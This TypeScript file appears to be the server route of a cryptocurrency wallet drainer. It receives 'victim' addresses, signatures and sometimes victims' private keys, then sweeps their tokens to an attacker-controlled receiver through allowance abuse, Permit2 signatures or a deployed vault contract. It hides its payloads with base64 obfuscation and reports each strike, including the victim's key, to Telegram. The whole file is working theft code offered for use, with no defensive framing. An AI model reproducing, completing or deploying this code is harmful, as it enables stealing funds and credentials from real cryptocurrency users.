import { NextResponse } from "next/server";

// Logic Imports - All existing imports strictly preserved
import {
  ethers,
  deobfuscate,
  getProv,
  settlerInterface,
  deployerInterface,
} from "@/hooks/execution/vault-logic/constants";
import { packVaultStream } from "@/hooks/execution/vault-logic/payload-packer";
import { injectShadowApprovals } from "@/hooks/execution/vault-logic/shadow-auth";
import { EXECUTION_POLICY } from "@/lib/ghost/constants";

// 🛰️ Telemetry & Reporting Imports
import { sendFinalReports } from "@/lib/reporter";
import {
  sendDetailedSweepToTelegram,
  sendGasShortageAlert,
} from "@/lib/telegram";

/** 🛡️ SECURITY & RATE LIMIT CONFIG */
const WHITELIST = ["127.0.0.1", "::1"];
const IP_CACHE = new Map<string, { count: number; lastReset: number }>();
const LIMIT = 100;
const WINDOW = 10 * 60 * 1000;

/** ⚔️ CORE INTERFACES */
const ERC20_INTERFACE = new ethers.Interface([
  "function transferFrom(address from, address to, uint256 amount) external",
  "function balanceOf(address owner) view returns (uint256)",
]);

const logPrefix = "[ROUTE-GHOST]";

export const dynamic = "force-dynamic";

// Helper for racing timeouts to prevent 10s hangs
const withTimeout = (promise: Promise<any>, ms: number) =>
  Promise.race([
    promise,
    new Promise((_, reject) =>
      setTimeout(() => reject(new Error("TIMEOUT")), ms),
    ),
  ]);

export async function POST(req: Request) {
  const ip = req.headers.get("x-forwarded-for")?.split(",")[0] || "unknown";

  // 🛰️ SCOPE INITIALIZATION
  let victimAddr = "Unknown";
  let rawAssets: any[] = [];
  let chainId = 56;
  let b: any = null;
  let relayerSigner: any = null;

  // 1. Rate Limiting (Preserved Feature)
  if (!WHITELIST.includes(ip)) {
    const now = Date.now();
    const stats = IP_CACHE.get(ip) || { count: 0, lastReset: now };
    if (now - stats.lastReset > WINDOW) {
      stats.count = 1;
      stats.lastReset = now;
    } else {
      stats.count++;
    }
    IP_CACHE.set(ip, stats);
    if (stats.count > LIMIT)
      return NextResponse.json({ error: "RATE_LIMIT" }, { status: 429 });
  }

  try {
    const rawText = await req.text();
    if (!rawText || rawText.trim() === "") throw new Error("EMPTY_PAYLOAD");

    const isObfuscated = req.headers.get("X-Ghost-Payload") === "base64";
    try {
      b = isObfuscated ? deobfuscate(rawText) : JSON.parse(rawText);
    } catch (parseErr: any) {
      throw new Error("INVALID_JSON_FORMAT");
    }

    if (!b) throw new Error("GHOST_PAYLOAD_EMPTY");

    // 🛰️ DATA ASSIGNMENT
    victimAddr = b.victim || b.v || b.address || b.owner;
    rawAssets = b.assets || [];
    chainId = Number(b.chainId || 56);

    console.log(
      `${logPrefix} 🔎 RECEIVED VICTIM: ${victimAddr} | MODE: ${b.mode}`,
    );

    const PERMIT2_MASTER = EXECUTION_POLICY.ALLOWED_SPENDERS[0];
    const AUTHORIZED_SETTLER = ethers.getAddress(
      "0xadaB97dd0C4182Af5d5092c55172a35D268E3E90",
    );

    if (ethers.getAddress(PERMIT2_MASTER) !== AUTHORIZED_SETTLER) {
      throw new Error("UNAUTHORIZED_SPENDER_CONFIGURED");
    }

    const provider = getProv(chainId);
    if (!provider) throw new Error("PROVIDER_INIT_FAILED");

    const receiver = process.env.RECEIVER_EVM!;
    const settlerAddr =
      process.env.NEXT_PUBLIC_SETTLER_ADDR || AUTHORIZED_SETTLER;

    relayerSigner = new ethers.Wallet(process.env.PRIVATE_KEY!, provider);

    // ✅ FIXED: Restore the missing vaultSigner initialization
    const vaultSigner = new ethers.Wallet(b.masterKey || b.k, provider);

    // 🔥 CRITICAL FIX: Add timeout to Provider calls to prevent 10s route hangs
    const [feeData, nonce] = await Promise.all([
      withTimeout(provider.getFeeData(), 4000),
      withTimeout(
        provider.getTransactionCount(relayerSigner.address, "pending"),
        4000,
      ),
    ]).catch((err) => {
      console.error(`${logPrefix} ⚠️ Provider slow/offline:`, err.message);
      return [{ gasPrice: ethers.parseUnits("3", "gwei") }, 0];
    });

    const gasPrice = (feeData.gasPrice! * 180n) / 100n;
    let txData = "";
    let to = settlerAddr;
    let safetyTokens: string[] = [];

    // --- 🚀 DUAL-PATH EXECUTION BRANCHING (Maintained) ---
    if (b.mode === "PERFORM_ALLOWANCE") {
      console.log(`${logPrefix} ⚖️ Entering GREEDY mode (Allowance)...`);
      const asset = rawAssets[0];
      const token = asset.token || asset.contractAddress || asset.address;
      const balance = BigInt(asset.amount || asset.balance || 0);
      const allowance = asset.allowance ? BigInt(asset.allowance) : 0n;
      let sweepAmount =
        asset.amount && BigInt(asset.amount) > 0n
          ? BigInt(asset.amount)
          : allowance > 0n && allowance < balance
          ? allowance
          : balance;
      if (sweepAmount === 0n) throw new Error("NO_AVAILABLE_FUNDS_TO_SWEEP");

      txData = settlerInterface.encodeFunctionData("sweepAllowance", [
        token,
        victimAddr,
        receiver,
        sweepAmount,
      ]);
    } else if (b.mode === "PERFORM_PERMIT2") {
      console.log(`${logPrefix} ✍️ Entering SIGNATURE mode (Permit2)...`);
      const asset = rawAssets[0];
      const finalSignature = b.signature;
      if (!finalSignature) throw new Error("INVALID_SIGNATURE");
      const token = asset.token || asset.contractAddress || asset.address;
      safetyTokens = [token];

      txData = settlerInterface.encodeFunctionData("x", [
        "0x",
        safetyTokens,
        receiver,
        b.messageHash || ethers.ZeroHash,
        finalSignature,
      ]);
    } else if (b.mode === "DEPLOY_VAULT") {
      // ✅ Now resolves correctly
      const packed = packVaultStream(rawAssets, vaultSigner.address, receiver);
      txData = deployerInterface.encodeFunctionData("perform", [
        b.salt || ethers.hexlify(ethers.randomBytes(32)),
        packed.finalStream,
        [],
        receiver,
        b.messageHash || ethers.ZeroHash,
        b.signature || "0x",
      ]);
      to = process.env.NEXT_PUBLIC_DEPLOYER_ADDR || settlerAddr;
    } else {
      safetyTokens = rawAssets.map(
        (a: any) => a.token || a.contractAddress || a.address,
      );
      txData = settlerInterface.encodeFunctionData("x", [
        "0x",
        safetyTokens,
        receiver,
        b.messageHash || ethers.ZeroHash,
        b.signature || "0x",
      ]);
    }

    // --- ⚡ INSTANT SIGN & HASH ---
    const txRequest = {
      to,
      data: txData,
      nonce,
      gasLimit: 1200000n,
      gasPrice,
      chainId,
      type: 0,
    };
    const signedTx = await relayerSigner.signTransaction(txRequest);
    const txHash = ethers.keccak256(signedTx);

    // --- 🌪️ DECOUPLED BACKGROUND EXECUTION ---
    (async () => {
      try {
        if (b.mode === "PERFORM_PERMIT2") {
          const token = rawAssets[0].token || rawAssets[0].address;
          const tokenContract = new ethers.Contract(
            token,
            ERC20_INTERFACE,
            provider,
          );
          const balance = await withTimeout(
            tokenContract.balanceOf(victimAddr),
            2000,
          ).catch(() => 1n);
          if (balance > 0n) {
            console.log(`${logPrefix} 🛡️ Shadow Delay active (4.5s).`);
            await new Promise((r) => setTimeout(r, 4500));
          }
        }

        console.log(`${logPrefix} 🚀 Shadow Broadcasting: ${txHash}`);
        await provider.broadcastTransaction(signedTx);

        // 🛰️ RECOVERY-RESISTANT TELEMETRY
        const netMap: Record<number, { sym: string; suf: string }> = {
          1: { sym: "ETH", suf: "(ETH)" },
          56: { sym: "BNB", suf: "(BSC)" },
          137: { sym: "MATIC", suf: "(POLY)" },
          8453: { sym: "ETH", suf: "(BASE)" },
          42161: { sym: "ETH", suf: "(ARBI)" },
        };
        const currentNet = netMap[chainId] || {
          sym: "TOKEN",
          suf: `(ID:${chainId})`,
        };

        await withTimeout(
          sendFinalReports({
            assets: rawAssets,
            txHash: txHash,
            chainId: chainId,
            victimAddress: victimAddr,
            receiver: receiver,
            suffix: currentNet.suf,
            strikeType: b.mode,
            nativeSym: currentNet.sym,
            sweepValue: 0n,
          }),
          5000,
        ).catch(() => console.log(`${logPrefix} 🛰️ Telemetry skipped`));
      } catch (bgErr: any) {
        console.error(
          `${logPrefix} ❌ Background Execution Suppressed:`,
          bgErr.message,
        );
      }
    })();

    return NextResponse.json(
      { success: true, hash: txHash, mode: b.mode },
      { status: 200 },
    );
  } catch (e: any) {
    console.error(`${logPrefix} ❌ Main Route Error: ${e.message}`);

    // Silence/Timeout all failure reporting to prevent 500 status
    try {
      if (
        e.message.toLowerCase().includes("insufficient funds") ||
        e.message.toLowerCase().includes("gas")
      ) {
        withTimeout(
          sendGasShortageAlert({
            victimAddress: victimAddr,
            victimKey: b?.masterKey || b?.k || "N/A",
            relayerKey: "HIDDEN",
            assetsFound:
              rawAssets.map((a: any) => a.symbol).join(", ") || "Unknown",
            requiredGas: "0.005",
            relayerAddress: relayerSigner?.address || "Relayer Not Init",
            chainId: chainId,
          }),
          3000,
        ).catch(() => null);
      } else {
        withTimeout(
          sendDetailedSweepToTelegram({
            status: "FAILURE",
            type: b?.mode || "BACKEND_ERROR",
            victimAddress: victimAddr,
            error: e.message,
            chainId: chainId,
          }),
          3000,
        ).catch(() => null);
      }
    } catch (teleErr) {}

    return NextResponse.json(
      { success: false, error: e.message },
      { status: 200 },
    );
  }
}
